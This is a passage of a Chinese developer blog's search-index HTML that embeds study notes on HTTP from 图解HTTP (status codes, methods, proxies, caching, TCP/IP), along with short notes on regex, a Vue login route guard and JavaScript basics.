&lt;li&gt;
&lt;p&gt;隧道&lt;/p&gt;
&lt;p&gt;隧道是在相隔甚远的客户端和服务器两者之间进行中转，并保持双方通信连接的应用程序&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;代理&#34;&gt;&lt;strong&gt;代理&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;利用代理服务器的理由：利用缓存技术减少网络带宽的流量，组织内部针对特定网站的访问控制，以获取访问日志为主要目的&lt;/p&gt;
&lt;p&gt;代理按两种基准分类：一种是是否使用缓存，另一种是是否会修改报文&lt;/p&gt;
&lt;h4 id=&#34;缓存代理&#34;&gt;缓存代理&lt;/h4&gt;
&lt;p&gt;代理转发响应时，缓存代理会预先将资源的副本（缓存）保存在代理服务器上&lt;/p&gt;
&lt;p&gt;当代理再次接收对相同资源的请求时，就可以不从源服务器那里获取资源，而是将之前缓存的资源作为响应返回&lt;/p&gt;
&lt;h4 id=&#34;透明代理&#34;&gt;透明代理&lt;/h4&gt;
&lt;p&gt;转发请求或响应时，不对报文做任何加工的代理类型被称为&lt;strong&gt;透明代理&lt;/strong&gt;，反之，称为非透明代理&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;网关&#34;&gt;网关&lt;/h2&gt;
&lt;p&gt;可以利用网关将HTTP请求转化为其他协议通信&lt;/p&gt;
&lt;p&gt;利用网关能提高通信的安全性，因为可以在客户端与网关之间的通信线路上加密以确保连接的安全。&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619484447634.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;隧道&#34;&gt;隧道&lt;/h2&gt;
&lt;p&gt;隧道可以按要求建立起一条与其他服务器的通信线路，可以使用SSL等加密手段进行通信。隧道的目的就是保住客户端与服务器能安全进行通信&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619484421757.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;隧道本身不会去解析HTTP请求。请求保持原样中转给服务器。隧道会在双方通信断开连接的时候结束&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;保存资源的缓存&#34;&gt;保存资源的缓存&lt;/h2&gt;
&lt;p&gt;代理服务器会在服务器返回的响应时，保存一份资源副本&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619484470802.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;缓存有效期&#34;&gt;缓存有效期&lt;/h3&gt;
&lt;p&gt;存在资源更新等影响，需要去向源服务器确认&lt;/p&gt;
&lt;h3 id=&#34;客户端的缓存&#34;&gt;客户端的缓存&lt;/h3&gt;
&lt;p&gt;缓存也可以存在于客户端浏览器中，这种叫做&lt;strong&gt;临时网络文件&lt;/strong&gt;&lt;/p&gt;
">图解HTTP第五章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tu-jie-http-di-si-zhang/"" data-c="
          &lt;h1 id=&#34;返回结果的http状态&#34;&gt;返回结果的HTTP状态&lt;/h1&gt;
&lt;h2 id=&#34;状态码告知从服务器端返回的请求结果&#34;&gt;状态码告知从服务器端返回的请求结果&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619419502006.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h2 id=&#34;2-xx成功&#34;&gt;&lt;strong&gt;2 XX成功&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;响应结果表明请求被正常处理&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h3 id=&#34;200-ok&#34;&gt;200 OK&lt;/h3&gt;
&lt;p&gt;正常处理&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;204-no-content&#34;&gt;204 NO Content&lt;/h3&gt;
&lt;p&gt;表示请求被成功处理，但在返回的响应报文中不含实体的主体部分。&lt;/p&gt;
&lt;p&gt;应用于只需要客户端往服务器发送信息，而对客户端不需要发送新信息的情况下使用&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;206-partial-content&#34;&gt;206 Partial Content&lt;/h3&gt;
&lt;p&gt;表示客户端进行了范围请求，而服务器成功执行这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容&lt;/p&gt;
&lt;hr&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3-xx重定向&#34;&gt;&lt;strong&gt;3 XX重定向&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;表明浏览器需要执行某些特殊的处理以正确处理请求&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h3 id=&#34;301-moved-permanently&#34;&gt;301 Moved Permanently&lt;/h3&gt;
&lt;p&gt;永久性重定向。表示请求的资源已经被分配了新的URI，以后应使用资源现在所指的URI&lt;/p&gt;
&lt;p&gt;例如当指定路径末尾未加&amp;quot;/&amp;quot;时，会产生301状态码&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;302-found&#34;&gt;302 Found&lt;/h3&gt;
&lt;p&gt;临时性重定向。表示请求的资源已经被分配了新的URI，希望用户能使用新的URI访问&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;303-see-other&#34;&gt;303 See Other&lt;/h3&gt;
&lt;p&gt;表示请求的资源存在着另一个URI，应使用GET方法定向获取请求的资源&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;304-not-modified&#34;&gt;304 Not Modified&lt;/h3&gt;
&lt;p&gt;表示客户端发送附带条件的请求时，服务器允许请求访问资源，但未找到满足条件的情况。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;307-temporary-redirect&#34;&gt;307 Temporary Redirect&lt;/h3&gt;
&lt;p&gt;临时冲顶先。与302相似。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 id=&#34;4-xx客户端错误&#34;&gt;&lt;strong&gt;4 XX客户端错误&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;表明客户端发生错误的原因所在&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h3 id=&#34;400-bad-request&#34;&gt;400 Bad Request&lt;/h3&gt;
&lt;p&gt;该状态码表示请求报文中存在语法错误。需修改请求的内容后再次发送请求。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;401-unauthorized&#34;&gt;401 Unauthorized&lt;/h3&gt;
&lt;p&gt;表示发送的请求需要有通过HTTP认证的认证信息&lt;/p&gt;
&lt;p&gt;当浏览器初次接收到401响应，会弹出认证用的对话窗口&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;403-forbidden&#34;&gt;403 Forbidden&lt;/h3&gt;
&lt;p&gt;表明请求的资源的访问被服务器拒绝了&lt;/p&gt;
&lt;p&gt;未获得文件系统的访问授权，访问权限出现某些问题等列举的情况都可能发生403的原因&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;404-not-found&#34;&gt;404 Not Found&lt;/h3&gt;
&lt;p&gt;表明服务器上无法找到请求的资源。&lt;/p&gt;
&lt;hr&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5-xx服务器错误&#34;&gt;&lt;strong&gt;5 XX服务器错误&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;服务器本身的错误&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h3 id=&#34;500-internal-server-error&#34;&gt;500 Internal Server Error&lt;/h3&gt;
&lt;p&gt;表明服务器在执行请求时发生了错误。也有可能是WEB应用存在的bug或某些临时故障&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;h3 id=&#34;503-service-unavailable&#34;&gt;503 Service Unavailable&lt;/h3&gt;
&lt;p&gt;表明服务器暂时处于超负荷或正在进行停机维护，现在无法处理请求。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;​&lt;/p&gt;
">图解HTTP第四章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tu-jie-http-di-san-zhang/"" data-c="
          &lt;h1 id=&#34;http报文内的http信息&#34;&gt;&lt;strong&gt;HTTP报文内的HTTP信息&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&#34;http报文&#34;&gt;&lt;strong&gt;HTTP报文&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;用于HTTP协议交互的信息被称为HTTP报文。请求端的HTTP报文叫做请求报文，响应端的叫做响应报文&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619330989639.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h3 id=&#34;请求行&#34;&gt;&lt;strong&gt;请求行&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;请求行包括请求的方法，URI和HTTP的版本&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;状态行&#34;&gt;&lt;strong&gt;状态行&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;包含响应结果的状态码，原因短语和HTTP版本&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;首部字段&#34;&gt;&lt;strong&gt;首部字段&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;包含表示请求和响应的各种条件和属性的各类首部&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;编码提升传输速率&#34;&gt;&lt;strong&gt;编码提升传输速率&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&#34;报文主体和实体主体的差异&#34;&gt;&lt;strong&gt;报文主体和实体主体的差异&lt;/strong&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;报文&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;是HTTP通信中的基本单位&lt;/strong&gt;，有8个字节流组成，通过HTTP通信传输&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;实体&lt;/p&gt;
&lt;p&gt;作为请求或响应的有效载荷数据被传输，其内容由实体首部和实体主体组成&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;HTTP报文的主体用于传输请求或响应的实体主体&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;压缩传输的内容编码&#34;&gt;&lt;strong&gt;压缩传输的内容编码&lt;/strong&gt;&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619331895496.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;h2 id=&#34;分割发送的分块传输编码&#34;&gt;分割发送的分块传输编码&lt;/h2&gt;
&lt;p&gt;在传输大容量数据时，通过把数据分割成多块，能够让浏览器逐步显示页面&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;分块传输编码&lt;/strong&gt;会将实体主体分成多个部分。每一块都会用十六进制来标记块的大小，而实体主体的最后一块会使用&amp;quot;0(CR+LF)&amp;quot;来标记&lt;/p&gt;
&lt;p&gt;客户端复制解码，恢复到编码前的实体主体&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;发送多种数据的多部分对象集合&#34;&gt;发送多种数据的多部分对象集合&lt;/h1&gt;
&lt;p&gt;例如图片，文件的上传&lt;/p&gt;
&lt;p&gt;在HTTP报文使用多部分对象集合时，需要在首部字段里加上Content-Type。&lt;/p&gt;
&lt;p&gt;boundary字符串来划分多部分对象集合指明的各类实体&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;获取部分内容的范围请求&#34;&gt;获取部分内容的范围请求&lt;/h1&gt;
&lt;p&gt;指定范围发送的请求叫&lt;strong&gt;范围请求&lt;/strong&gt;&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619332602950.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;内容协商返回最合适的内容&#34;&gt;内容协商返回最合适的内容&lt;/h1&gt;
&lt;p&gt;例网站的中英文版本，以下内容作为为判断标准&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Accept&lt;/li&gt;
&lt;li&gt;Accept-Charset&lt;/li&gt;
&lt;li&gt;Accept-Encoding&lt;/li&gt;
&lt;li&gt;Accept-Language&lt;/li&gt;
&lt;li&gt;Content-Language&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内容协商三种类型&lt;/p&gt;
&lt;h3 id=&#34;服务器驱动协商&#34;&gt;服务器驱动协商&lt;/h3&gt;
&lt;h3 id=&#34;客户端驱动协商&#34;&gt;客户端驱动协商&lt;/h3&gt;
&lt;h3 id=&#34;透明协商&#34;&gt;透明协商&lt;/h3&gt;
">图解HTTP第三章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tu-jie-http-di-er-zhang/"" data-c="
          &lt;h2 id=&#34;http协议用于客户端和服务端之间的通信&#34;&gt;&lt;strong&gt;HTTP协议用于客户端和服务端之间的通信&lt;/strong&gt;&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619145642116.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;br&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619145670666.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;br&gt;
&lt;h2 id=&#34;http是不保存状态协议&#34;&gt;&lt;strong&gt;HTTP是不保存状态协议&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;HTTP是不保存状态的协议，即无状态协议。HTTP协议自身不对请求和响应之间的通信状态进行保存。这样是为了更快的处理大量事务，确保协议的 可伸缩性&lt;/p&gt;
&lt;p&gt;为了保证页面跳转时的状态保存，Cooike就被引入&lt;/p&gt;
&lt;br&gt;
&lt;p&gt;## &lt;em&gt;&lt;strong&gt;*请求URI定位资源*&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619145690268.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;br&gt;
&lt;h2 id=&#34;告知服务器意图的http方法&#34;&gt;&lt;strong&gt;告知服务器意图的HTTP方法&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;GET&lt;/strong&gt;：获取资源&lt;/p&gt;
&lt;p&gt;GET方法用来请求访问已被URI 识别的资源&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619147700579.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;POST&lt;/strong&gt;：传输实体主体&lt;/p&gt;
&lt;p&gt;POST传输更常用&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619147796053.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;PUT&lt;/strong&gt;：传输文件&lt;/p&gt;
&lt;p&gt;PUT方法自身不带验证机制，在一般情况下不用&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619147670212.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;HEAD&lt;/strong&gt;：获得报文头部&lt;/p&gt;
&lt;p&gt;HEAD方法和GET方法一样，只是不返回报文主体部分，用于确认URI的有效性及资源更新的日期时间等&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619147639933.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;DELETE&lt;/strong&gt;：删除文件&lt;/p&gt;
&lt;p&gt;与PUT方法相反的方法，也是不带验证机制的方法&lt;br&gt;
&lt;img src=&#34;https://fanfankill.github.io/post-images/1619147846458.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;OPTIONS&lt;/strong&gt;：询问支持的方法&lt;/p&gt;
&lt;p&gt;OPTIONS方法用来查询针对URI指定的资源支持的方法&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;TRACE&lt;/strong&gt;：追踪路径&lt;br&gt;
TRACE方法是让WEB服务器端将之前的请求通信返回给客户端的方法&lt;br&gt;
客户端用于查询发送出去的请求怎样被加工的，但不常用&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;持久连接&#34;&gt;&lt;strong&gt;持久连接&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;因为每进行一次HTTP通信就要断开一次TCP连接，对于网页的请求就要很多次的连接和断开操作，浪费通信量。&lt;/p&gt;
&lt;p&gt;所以HTTP keep-alive的方法出现，只要任意一端没有明确提出断开连接，则保持TCP连接状态&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;使用cookie的状态管理&#34;&gt;&lt;strong&gt;使用Cookie的状态管理&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Cookie技术通过在请求和响应报文中写入Cookie信息来控制客户端的状态&lt;/p&gt;
&lt;p&gt;Cookie会根据从服务端发送的响应报文内的一个叫做Set-Cookie的首部字段信息，通知客户端保存Cookie。当下次客户端再往该服务器发送请求时，客户端会自动在请求报文中加入Cookie值发送出去&lt;/p&gt;
">图解HTTP 第二章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/tu-jie-http/"" data-c="
          &lt;h2 id=&#34;http超文本传输协议&#34;&gt;HTTP（超文本传输协议）&lt;/h2&gt;
&lt;br&gt;
&lt;h2 id=&#34;tcpip-分层&#34;&gt;TCP/IP 分层&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;应用层&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  	     1. 决定向用户提供应用服务时通信的活动 (HTTP，FTP，DNS)  
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;传输层&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  	     1. 提供处于网络连接中两台计算机之间的数据传输
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络层&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  	     1. 处理网络上流动的数据包，为数据传输选择一条路线
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;数据链路层&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  	     1. 一些肉眼可见的硬件设施 网卡 光纤 等
&lt;/code&gt;&lt;/pre&gt;
&lt;br&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;tcpip通信传输流&#34;&gt;TCP/IP通信传输流&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;客户端&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;过程&lt;/th&gt;
&lt;th style=&#34;text-align:right&#34;&gt;服务器&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;应用层&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;HTTP数据&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;应用层&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;传输层&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;加/消去 TCP首部&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;传输层&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;网络层&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;加/消去 IP首部&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;网络层&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;链路层&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;加/消去 以太网首部&lt;/td&gt;
&lt;td style=&#34;text-align:right&#34;&gt;链路层&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;与http关系紧密的协议&#34;&gt;&lt;strong&gt;与HTTP关系紧密的协议&lt;/strong&gt;&lt;/h1&gt;
&lt;br&gt;
&lt;h3 id=&#34;负责传输的ip协议&#34;&gt;&lt;strong&gt;负责传输的IP协议&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;IP(网际协议)处于网络层，IP协议的作用是把各种数据包传送给对方，而确保传送到对方那里，要满足各种条件。其中两个重要的条件就是&lt;strong&gt;IP地址&lt;/strong&gt;和&lt;strong&gt;MAC地址&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;IP地址&lt;/strong&gt;指明了节点被分配到的地址，&lt;strong&gt;Mac地址&lt;/strong&gt;是指网卡所属的固定地址，IP地址可以和MAC地址进行匹配。IP地址可以变换，MAC地址基本不会更改&lt;/p&gt;
&lt;br&gt;
&lt;h3 id=&#34;arp协议&#34;&gt;&lt;strong&gt;ARP协议&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;IP间的通信依赖MAC地址。在网络上，通信的双方在同一局域网（LAN）内的情况还是很少的，通常需要多台计算机和网络设备中转。而在进行中转时，&lt;strong&gt;会利用下一站中转设备的MAC地址来搜索下一个中转目标&lt;/strong&gt;。ARP是一种用以解析地址的协议，根据通信方的IP地址就可以反查出对应的MAC地址&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h3 id=&#34;tcp协议&#34;&gt;&lt;strong&gt;TCP协议&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;TCP协议位于传输层，提供可靠的字节流服务。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;字节流服务&lt;/strong&gt;指为了方便传输将大块数据分割成以报文段为单位的数据包进行管理&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可靠的服务&lt;/strong&gt;指TCP协议能够确认数据最终是否送到对方&lt;/p&gt;
&lt;br&gt;
&lt;h4 id=&#34;确保数据能达到目标&#34;&gt;&lt;strong&gt;确保数据能达到目标&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;TCP协议采用&lt;strong&gt;三次握手&lt;/strong&gt;策略。用TCP协议把数据包送出去后，TCP一定会向对方确认是否成功送达。握手过程中使用了TCP的标志——SYN和——ACK。&lt;/p&gt;
&lt;p&gt;发送端首先发送一个带SYN标志的数据包给对方。接收端收到后，回传一个带有SYN/ACK标志的数据包以示传达确认信息。最后发送端再回传一个带ACK标志的数据包，代表“握手”结束&lt;/p&gt;
&lt;p&gt;若在握手的过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h2 id=&#34;负责域名解析的dns服务&#34;&gt;&lt;strong&gt;负责域名解析的DNS服务&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;DNS服务位于应用层的协议。它提供域名到IP地址之间的解析服务&lt;/p&gt;
&lt;p&gt;DNS协议提供通过&lt;strong&gt;域名&lt;/strong&gt;(例如 www.baidu.com)查找&lt;strong&gt;IP&lt;/strong&gt;(14.215.177.39)，或逆向从IP反查域名的服务(cmd的nslookup 指令)&lt;/p&gt;
&lt;br&gt;
&lt;h2 id=&#34;各种协议与http协议的关系&#34;&gt;各种协议与HTTP协议的关系&lt;/h2&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1619064689862.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">图解HTTP 第一章</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/zheng-ze-biao-da-shi/"" data-c="
          &lt;h1 id=&#34;语法&#34;&gt;语法&lt;/h1&gt;
&lt;p&gt;runoo+b，可以匹配 runoob、runooob、runoooooob 等，+ 号代表前面的字符必须至少出现一次（1次或多次）。&lt;/p&gt;
&lt;p&gt;runoo&lt;em&gt;b，可以匹配 runob、runoob、runoooooob 等，&lt;/em&gt; 号代表前面的字符可以不出现，也可以出现一次或者多次（0次、或1次、或多次）。&lt;/p&gt;
&lt;p&gt;colou?r 可以匹配 color 或者 colour，? 问号代表前面的字符最多只可以出现一次（0次、或1次）。&lt;/p&gt;
">正则表达式</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/vue-qian-zhi-dao-hang-shou-wei/"" data-c="
          &lt;h1 id=&#34;路由守卫&#34;&gt;路由守卫&lt;/h1&gt;
&lt;h2 id=&#34;当token不存在时-跳转到登陆界面&#34;&gt;当token不存在时 跳转到登陆界面&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;只有登录界面时 (不考虑注册等其他界面)&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-router.beforeEach((to,from,next)=&amp;gt;{&#34;&gt;  let token=localStorage.getItem(&amp;quot;token&amp;quot;);
  if(token){//判断是否登录
    next()
  }

  else{
    if(to.path!==&#39;/login&#39;){
      alert(&amp;quot;请先登录&amp;quot;)
      next({path:&#39;/login&#39;})
    }
    else{
      next()
    }
  }
});
&lt;/code&gt;&lt;/pre&gt;
">VUE 前置导航守卫</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/niu-ke-cuo-ti/"" data-c="
          &lt;br&gt;
&lt;h1 id=&#34;3true&#34;&gt;3==true&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1617673888601.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;br&gt;
&lt;br&gt;
&lt;br&gt;
&lt;h1 id=&#34;2tostring&#34;&gt;2.toString()&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://fanfankill.github.io/post-images/1617673913588.PNG&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-数组查重返回有重复的值&#34;&gt;3 数组查重(返回有重复的值)&lt;/h1&gt;
&lt;pre&gt;&lt;code&gt;function(arr)
{
    let res=[];
    arr.forEach(function(val){
        //保证是重复项且新数组中没有存这项
        if(arr.indexOf(val)!=arr.lastIndexOf(val)&amp;amp;&amp;amp;res.indexOf(val)==-1)
        {
            res.push(val)
        }
    } )
    return res
}
&lt;/code&gt;&lt;/pre&gt;
">牛客</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://fanfankill.github.io/post/js-ji-ben-shu-ju-lei-xing/"" data-c="
          &lt;h1 id=&#34;基本数据类型&#34;&gt;基本数据类型&lt;/h1&gt;
&lt;p&gt;ECMAScript中有5中简单数据类型（也称为基本数据类型）: Undefined、Null、Boolean、Number和String。还有1中复杂的数据类型————Object，Object本质上是由一组无序的名值对组成的。&lt;/p&gt;
&lt;br&gt;
&lt;h1 id=&#34;typeof-操作符&#34;&gt;typeof 操作符&lt;/h1&gt;
&lt;p&gt;由于js中的变量是松散类型的，所以它提供了一种检测当前变量的数据类型的方法，也就是typeof关键字.&lt;br&gt;
通过typeof关键字，对这5种数据类型会返回下面的值（以字符串形式显示)&lt;br&gt;
undefined ---------- 如果值未定义 Undefined&lt;/p&gt;
&lt;p&gt;boolean ---------- 如果这个值是布尔值 Boolean&lt;/p&gt;
&lt;p&gt;string ---------- 如果这个值是字符串 String&lt;/p&gt;
&lt;p&gt;number ---------- 如果这个值是数值类型 Number&lt;/p&gt;
&lt;p&gt;object ---------- 如果这个值是对象或null Object&lt;/p&gt;
&lt;p&gt;需要注意的是typeof null返回为object,因为特殊值null被认为是一个空的对象引用。&lt;/p&gt;
&lt;br&gt;
&lt;h1 id=&#34;undefined&#34;&gt;Undefined&lt;/h1&gt;
